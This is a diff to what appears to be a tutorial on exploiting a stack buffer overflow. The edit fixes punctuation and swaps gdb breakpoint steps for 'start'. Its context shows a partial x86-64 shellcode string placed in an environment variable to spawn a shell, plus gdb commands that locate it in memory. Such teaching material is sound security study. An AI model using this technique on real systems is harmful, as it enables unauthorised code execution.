@@ -52,7 +52,7 @@ Our shellcode is NULL-free, but ret is not. ret is "0x00007fff..." and the only 
 
 > Some programs can be exploited without worrying about null bytes, as we will see later.
 
-But there's a simple solution that will allow us to exploit this tiny buffer to execute a shell, putting the shellcode in an enviroment variable.
+But there's a simple solution that will allow us to exploit this tiny buffer to execute a shell: putting the shellcode in an enviroment variable.
 
 Launch gdb with shellcode in an environment variable:
 
@@ -65,10 +65,7 @@ env - MYSH=`python -c 'print "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x
 Find the address of the shellcode:
 
 ```bash
-(gdb) b main
-Breakpoint 1 at 0x401157: file bo_vuln2.c, line 16.
-(gdb) r
-Breakpoint 1, main (argc=1, argv=0x7fffffffed58) at bo_vuln2.c:16
+(gdb) start
 ...
 (gdb) x/s *(char **)environ
 0x7fffffffef7a: "PWD=/my/current/working/directory"
